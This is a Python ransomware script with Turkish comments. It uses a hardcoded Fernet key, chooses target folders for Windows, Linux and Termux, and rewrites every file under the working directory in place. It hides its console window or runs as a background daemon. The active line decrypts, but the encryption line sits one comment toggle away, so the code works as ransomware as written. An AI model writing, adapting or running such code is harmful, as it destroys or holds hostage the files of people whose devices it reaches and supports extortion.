import os, sys      # os : os.walk , os.remove  | sys : sys.argv
import platform     # işlemci ayrımı yaparak termux kullanan arkadaşlar için de süprizler yapacağız
from cryptography.fernet import Fernet

#key = Fernet.generate_key()                                                # iyisinden bir key oluşturduk
key = 'djceqf2ccdymwB-utBbTJlaLDc2CA5RVgonZ0PNWyak='.encode()               # key'i çözelim
fer = Fernet(key)
print("Unutma ! Key --> "+str(key))
with open("key.key","w+") as yaz: yaz.write("Unutma ! Key --> "+str(key))   # ilerde lazım olabilir key'imizi kayıt edelim :)
                                                                            # !Gerçek fidye uygulamasında key kullanıcının cihazında saklanmaz !
                                                                            # Key'i tedbir amaçlı kayıt ediyoruz lakin bilin ki güvende değil !
                                                                            # !Fidye uygulamamız key.key 'i de crypt edebilir !

if platform.system() == "Windows":
    baglac = "\\"
    konum = "\\Users"                                               # Eğer sistem windows ise şifrelemeye başlacağımız klasör Users olacak
elif platform.system() == "Linux":
    baglac = "/"
    if platform.machine() == "aarch64": konum = "/sdcard"           # Eğer hekır dostumuz termuxcuysa klasörümüz /sdcard oluyor
    else:
        if os.geteuid() == 0: konum = "/root"                       # Elemanımız kalici ise root'dan başlıyoruz
        else: konum = "/home"                                       # Elemanımız kalici değil ise home .
else: raise OSError(" Seninle işimiz yok kardeşim haydi işine ")    # Desteklenmeyen platform açmaya kalkarsa ..

def Edebiyat(dosya):
    try:
        with open(dosya,"rb") as oku: oku = oku.read()
        #with open(dosya,"wb") as yaz: yaz.write(fer.encrypt(oku))
        with open(dosya, "wb") as yaz: yaz.write(fer.decrypt(oku))
    except:pass

def Matematik():
    for adres in os.walk(os.getcwd()):                        # Daha önceden adres değerini verdiğimiz tüm bağlacı burada kullanıyoruz (os.walk() ile tüm alt dizinleri görüntüleyebiliriz)
        if adres[2]:                                    # adres[2] 'si dosya'lara denk geliyor , eğer dosya var ise :
            for dosya in adres[2]:                      # adres[2]'nin içeriği liste olduğu için bir for döngüsü ile tek tek çıkartıyoruz
                link = f"{adres[0]}{baglac}{dosya}"     # karışmasın diye link adlı değişkene atadık
                Edebiyat(link)


if __name__ == "__main__":
    if platform.system() == "Windows":
        import win32console, win32gui       # Windows terminali gizlemek için kullanıcaz
        win32gui.ShowWindow(win32console.GetConsoleWindow(), 0)
        Matematik()
    else:
        import daemon                       # python dosyasını arkaplanda çalıştırmak için kullanıcaz
        with daemon.DaemonContext():
            Matematik()